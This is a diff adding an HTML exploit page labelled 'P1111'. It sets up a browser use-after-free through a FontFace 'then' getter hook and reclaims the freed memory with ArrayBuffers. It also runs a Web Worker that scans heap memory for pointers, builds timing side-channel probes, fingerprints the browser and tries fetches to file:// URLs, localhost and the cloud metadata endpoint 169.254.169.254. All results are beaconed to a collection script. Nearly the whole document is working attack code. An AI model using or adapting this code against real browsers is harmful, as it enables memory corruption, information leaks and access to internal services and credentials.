@@ -1,0 +1,394 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1111</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}.warn{color:#ff6}</style>
+</head><body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+
+B('P1111-BOOT','');
+log('phase','=== P1111: WORKER DEEP-DIVE ===');
+log('win','Workers CONFIRMED alive from P1110 — now exploit them!');
+
+// ============================================================
+// Build a comprehensive worker script
+// ============================================================
+var workerCode = [
+'var results = {};',
+'',
+'// A: Timer resolution',
+'var t0 = performance.now();',
+'var t1 = performance.now();',
+'var samples = [];',
+'for(var i=0;i<100;i++){',
+'  var a=performance.now(), b=performance.now();',
+'  if(b>a) samples.push(b-a);',
+'}',
+'results.timerMin = samples.length>0 ? Math.min.apply(null,samples) : -1;',
+'results.timerSamples = samples.slice(0,10).join(",");',
+'',
+'// B: Timing amplification — count iterations in 50ms',
+'var ampStart = performance.now();',
+'var ampCount = 0;',
+'while(performance.now() - ampStart < 50) ampCount++;',
+'results.ampCount = ampCount;',
+'results.ampRate = Math.round(ampCount / 50) + "k/ms";',
+'',
+'// C: Available APIs',
+'results.hasFetch = typeof fetch !== "undefined";',
+'results.hasXHR = typeof XMLHttpRequest !== "undefined";',
+'results.hasWS = typeof WebSocket !== "undefined";',
+'results.hasIDB = typeof indexedDB !== "undefined";',
+'results.hasCache = typeof caches !== "undefined";',
+'results.hasCrypto = typeof crypto !== "undefined";',
+'results.hasSubtle = typeof crypto !== "undefined" && typeof crypto.subtle !== "undefined";',
+'results.hasBlob = typeof Blob !== "undefined";',
+'results.hasURL = typeof URL !== "undefined";',
+'results.hasAB = typeof ArrayBuffer !== "undefined";',
+'results.hasSAB = typeof SharedArrayBuffer !== "undefined";',
+'results.hasBigInt = typeof BigInt !== "undefined";',
+'results.hasBU64 = typeof BigUint64Array !== "undefined";',
+'results.hasPerf = typeof performance !== "undefined";',
+'results.hasNav = typeof navigator !== "undefined";',
+'results.hasLocation = typeof location !== "undefined";',
+'results.hasSelf = typeof self !== "undefined";',
+'',
+'// D: Navigator info from worker',
+'if(typeof navigator !== "undefined"){',
+'  results.ua = (navigator.userAgent||"").substring(0,200);',
+'  results.platform = navigator.platform||"";',
+'  results.hwConc = navigator.hardwareConcurrency||0;',
+'  results.lang = navigator.language||"";',
+'}',
+'',
+'// E: Try fetch to various URLs',
+'var fetchTests = [',
+'  {name:"self", url:"/beacon.php?tag=P1111-WORKER-FETCH&data=hello"},',
+'  {name:"file_root", url:"file:///"},',
+'  {name:"file_dev", url:"file:///dev/"},',
+'  {name:"localhost", url:"http://localhost/"},',
+'  {name:"meta", url:"http://169.254.169.254/"},',
+'  {name:"internal", url:"http://127.0.0.1:9090/"},',
+'  {name:"data", url:"data:text/plain,test"},',
+'  {name:"blob_test", url: URL.createObjectURL(new Blob(["blobdata"],{type:"text/plain"}))},',
+'].filter(function(t){return typeof fetch !== "undefined";});',
+'',
+'var fetchResults = {};',
+'var fetchDone = 0;',
+'var fetchTotal = fetchTests.length;',
+'',
+'function checkFetchDone(){',
+'  fetchDone++;',
+'  if(fetchDone >= fetchTotal){',
+'    results.fetches = fetchResults;',
+'    doPhaseF();',
+'  }',
+'}',
+'',
+'if(fetchTotal === 0){',
+'  results.fetches = "noFetch";',
+'  doPhaseF();',
+'}else{',
+'  for(var i=0;i<fetchTests.length;i++){',
+'    (function(test){',
+'      try{',
+'        fetch(test.url,{mode:"no-cors"}).then(function(r){',
+'          fetchResults[test.name] = "status="+r.status+"|type="+r.type+"|ok="+r.ok;',
+'          if(r.ok && test.name !== "self"){',
+'            r.text().then(function(txt){',
+'              fetchResults[test.name] += "|len="+txt.length+"|pre="+txt.substring(0,50);',
+'              checkFetchDone();',
+'            }).catch(function(){checkFetchDone();});',
+'          }else{checkFetchDone();}',
+'        }).catch(function(e){',
+'          fetchResults[test.name] = "ERR:"+e.message;',
+'          checkFetchDone();',
+'        });',
+'      }catch(e){',
+'        fetchResults[test.name] = "THROW:"+e.message;',
+'        checkFetchDone();',
+'      }',
+'    })(fetchTests[i]);',
+'  }',
+'}',
+'',
+'function doPhaseF(){',
+'  // F: Sub-worker test',
+'  results.subWorker = "untested";',
+'  try{',
+'    var subBlob = new Blob(["postMessage(42)"],{type:"application/javascript"});',
+'    var subUrl = URL.createObjectURL(subBlob);',
+'    var sub = new Worker(subUrl);',
+'    sub.onmessage = function(e){',
+'      results.subWorker = "alive|val="+e.data;',
+'      URL.revokeObjectURL(subUrl);',
+'      sub.terminate();',
+'      doPhaseG();',
+'    };',
+'    sub.onerror = function(e){',
+'      results.subWorker = "ERR:"+e.message;',
+'      doPhaseG();',
+'    };',
+'    setTimeout(function(){',
+'      if(results.subWorker === "untested"){',
+'        results.subWorker = "timeout";',
+'        doPhaseG();',
+'      }',
+'    },2000);',
+'  }catch(e){',
+'    results.subWorker = "THROW:"+e.message;',
+'    doPhaseG();',
+'  }',
+'}',
+'',
+'function doPhaseG(){',
+'  // G: Heap scan in worker — allocate and check for stale data',
+'  var workerStale = 0;',
+'  var workerPtrLike = 0;',
+'  var workerPtrs = [];',
+'  for(var i=0;i<10;i++){',
+'    var ab = new ArrayBuffer(4096);',
+'    var b = new BigUint64Array(ab);',
+'    for(var q=0;q<b.length;q++){',
+'      if(b[q] !== 0n){',
+'        workerStale++;',
+'        var hi = Number(b[q] >> 32n);',
+'        if(hi >= 0x10 && hi <= 0xFF) workerPtrs.push("buf"+i+"+"+q*8+"=0x"+b[q].toString(16));',
+'        if(hi >= 0x200 && hi <= 0x7FFF) workerPtrLike++;',
+'      }',
+'    }',
+'  }',
+'  results.workerStale = workerStale;',
+'  results.workerPtrLike = workerPtrLike;',
+'  results.workerPtrSamples = workerPtrs.slice(0,5).join("|");',
+'',
+'  // H: Timing loop precision test',
+'  // Do 10 rounds of 1M iterations, measure each',
+'  var timings = [];',
+'  for(var r=0;r<10;r++){',
+'    var s = performance.now();',
+'    var x = 0;',
+'    for(var j=0;j<1000000;j++) x += j;',
+'    var e = performance.now();',
+'    timings.push(e - s);',
+'  }',
+'  results.loopTimings = timings.join(",");',
+'  results.loopJitter = (Math.max.apply(null,timings) - Math.min.apply(null,timings)).toFixed(1);',
+'  results.sinkhole = x; // prevent optimization',
+'',
+'  // I: Try importScripts',
+'  results.importScripts = "untested";',
+'  try{',
+'    importScripts("data:text/javascript,void(0)");',
+'    results.importScripts = "ok";',
+'  }catch(e){',
+'    results.importScripts = "ERR:"+e.message;',
+'  }',
+'',
+'  // J: Transfer test — can we receive transferred ArrayBuffers?',
+'  results.transferReady = true;',
+'',
+'  // Send all results back',
+'  postMessage({type:"results", data:results});',
+'}',
+'',
+'// Listen for transferred ArrayBuffer from main thread',
+'self.onmessage = function(e){',
+'  if(e.data && e.data.type === "transfer_test"){',
+'    var ab = e.data.buffer;',
+'    var view = new BigUint64Array(ab);',
+'    var nz = 0;',
+'    var vals = [];',
+'    for(var q=0;q<view.length;q++){',
+'      if(view[q] !== 0n){',
+'        nz++;',
+'        vals.push("+"+q*8+"=0x"+view[q].toString(16));',
+'      }',
+'    }',
+'    postMessage({type:"transfer_result", nz:nz, vals:vals.join("|"), len:view.length});',
+'    // Transfer back',
+'    postMessage({type:"transfer_back", buffer:ab}, [ab]);',
+'  }',
+'  if(e.data && e.data.type === "timing_probe"){',
+'    // Timing probe: measure access time to specific buffer offsets',
+'    var ab = e.data.buffer;',
+'    var view = new Uint8Array(ab);',
+'    var offset = e.data.offset || 0;',
+'    var rounds = e.data.rounds || 100000;',
+'    var s = performance.now();',
+'    var x = 0;',
+'    for(var i=0;i<rounds;i++) x += view[(offset + i) & (view.length-1)];',
+'    var elapsed = performance.now() - s;',
+'    postMessage({type:"timing_result", offset:offset, elapsed:elapsed, rounds:rounds, x:x});',
+'    postMessage({type:"timing_back", buffer:ab}, [ab]);',
+'  }',
+'};'
+].join('\n');
+
+var blob = new Blob([workerCode], {type: 'application/javascript'});
+var url = URL.createObjectURL(blob);
+var worker = new Worker(url);
+
+worker.onmessage = function(e) {
+  var d = e.data;
+
+  if (d.type === 'results') {
+    var r = d.data;
+    log('phase', '--- Worker Results ---');
+
+    // Timer
+    B('P1111-TIMER', 'min='+r.timerMin+'|samples='+r.timerSamples);
+    log('info', 'Timer min delta: '+r.timerMin+'ms, samples: '+r.timerSamples);
+
+    // Amplification
+    B('P1111-AMP', 'count='+r.ampCount+'|rate='+r.ampRate);
+    log(r.ampCount > 100000 ? 'win' : 'info', 'Amplification: '+r.ampCount+' iters in 50ms = '+r.ampRate);
+
+    // APIs
+    var apis = [];
+    var apiKeys = ['hasFetch','hasXHR','hasWS','hasIDB','hasCache','hasCrypto','hasSubtle',
+                   'hasBlob','hasURL','hasAB','hasSAB','hasBigInt','hasBU64','hasPerf','hasNav'];
+    for(var i=0;i<apiKeys.length;i++){
+      var k=apiKeys[i];
+      if(r[k]) apis.push(k.replace('has',''));
+    }
+    B('P1111-APIS', apis.join(','));
+    log('ok', 'Worker APIs: '+apis.join(', '));
+
+    // Navigator
+    B('P1111-NAV', 'ua='+r.ua+'|plat='+r.platform+'|cores='+r.hwConc+'|lang='+r.lang);
+    log('info', 'UA: '+(r.ua||'').substring(0,80));
+    log('info', 'Platform: '+r.platform+' | Cores: '+r.hwConc+' | Lang: '+r.lang);
+
+    // Fetch results
+    if(typeof r.fetches === 'object'){
+      var fetchKeys = Object.keys(r.fetches);
+      for(var i=0;i<fetchKeys.length;i++){
+        var k=fetchKeys[i];
+        var v=r.fetches[k];
+        var isHit = v.indexOf('ok=true')>=0 || v.indexOf('status=200')>=0;
+        B('P1111-FETCH-'+k, v);
+        log(isHit?'win':'info', 'Fetch '+k+': '+v);
+      }
+    }
+
+    // Sub-worker
+    B('P1111-SUBW', r.subWorker);
+    log(r.subWorker.indexOf('alive')>=0?'win':'info', 'Sub-worker: '+r.subWorker);
+
+    // Worker heap
+    B('P1111-WHEAP', 'stale='+r.workerStale+'|ptrs='+r.workerPtrLike+'|samples='+r.workerPtrSamples);
+    if(r.workerPtrLike>0) log('win', 'Worker heap: '+r.workerPtrLike+' code-range ptrs!');
+    else log('info', 'Worker heap: stale='+r.workerStale+', no code ptrs');
+
+    // Loop timings
+    B('P1111-LOOP', 'timings='+r.loopTimings+'|jitter='+r.loopJitter);
+    log('info', 'Loop timings (1M iter): '+r.loopTimings);
+    log('info', 'Jitter: '+r.loopJitter+'ms');
+
+    // importScripts
+    B('P1111-IMPORT', r.importScripts);
+    log('info', 'importScripts: '+r.importScripts);
+
+    // Now do the transfer test — send our UAF buffer to the worker
+    doTransferTest();
+  }
+
+  if (d.type === 'transfer_result') {
+    B('P1111-XFER', 'nz='+d.nz+'|len='+d.len+'|'+d.vals);
+    log(d.nz>0?'win':'info', 'Transfer: Worker read '+d.nz+' nonzero qwords: '+d.vals);
+  }
+
+  if (d.type === 'transfer_back') {
+    // Got buffer back from worker
+    var view = new BigUint64Array(d.buffer);
+    log('ok', 'Transfer back: buffer returned, len='+view.length);
+    B('P1111-XFER-BACK', 'len='+view.length);
+
+    // Final
+    setTimeout(function(){
+      B('P1111-DONE','');
+      log('phase','=== P1111 COMPLETE ===');
+    }, 500);
+  }
+
+  if (d.type === 'timing_result') {
+    B('P1111-TIME', 'off='+d.offset+'|ms='+d.elapsed+'|rounds='+d.rounds);
+    log('info', 'Timing: offset='+d.offset+' → '+d.elapsed+'ms for '+d.rounds+' reads');
+  }
+};
+
+worker.onerror = function(e) {
+  B('P1111-WERR', e.message);
+  log('fail', 'Worker error: '+e.message);
+};
+
+// ============================================================
+// FontFace UAF + reclaim for transfer test
+// ============================================================
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8;
+var st1=document.createElement('style');
+st1.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st1);
+var f0=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(f0);void f0.loaded;
+
+var fired=false,map1=null,buf=null,uafAB=null,patched=false;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(fired)return undefined;fired=true;
+  if(st1){st1.remove();st1=null;}
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+  map1=[];
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    for(var k=0;k<K;k++){map1.push({size:sz,ab:new ArrayBuffer(sz),idx:si*K+k});}
+  }
+  try{document.fonts.check('1em s0');}catch(e){}
+  return undefined;
+},set:function(){}});
+document.fonts.load('1em f0, s0','AB').then(function(){},function(){});
+
+for(var t=10;t<=200;t+=5){(function(ms){setTimeout(function(){
+  if(patched||!map1)return;
+  for(var bi=32;bi<40;bi++){
+    if(!map1[bi])continue;
+    var b=new BigUint64Array(map1[bi].ab);
+    var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
+    if(nz>0&&!patched){
+      patched=true;buf=b;uafAB=map1[bi].ab;
+      b[0]=0x100n;
+      var ptrs=[];
+      for(var q=0;q<b.length;q++)if(b[q]!==0n)ptrs.push('+'+q*8+'=0x'+b[q].toString(16));
+      B('P1111-UAF','buf='+bi+'|'+ptrs.join(','));
+    }
+  }
+},ms);})(t);}
+
+function doTransferTest(){
+  if(!patched||!uafAB){
+    B('P1111-XFER','noUAF');
+    log('warn','No UAF buffer to transfer');
+    B('P1111-DONE','');
+    return;
+  }
+
+  log('phase','--- Transfer UAF buffer to Worker ---');
+  // Transfer the UAF ArrayBuffer to the worker
+  // This is zero-copy — worker reads the SAME physical memory
+  try{
+    worker.postMessage({type:'transfer_test', buffer:uafAB}, [uafAB]);
+    log('ok','Transferred UAF buffer to worker');
+    // After transfer, our buf/uafAB are detached (byteLength=0)
+    log('info','Main thread buffer detached: '+uafAB.byteLength+' bytes');
+  }catch(e){
+    B('P1111-XFER','ERR:'+e.message);
+    log('fail','Transfer failed: '+e.message);
+    B('P1111-DONE','');
+  }
+}
+</script>
+</body></html>
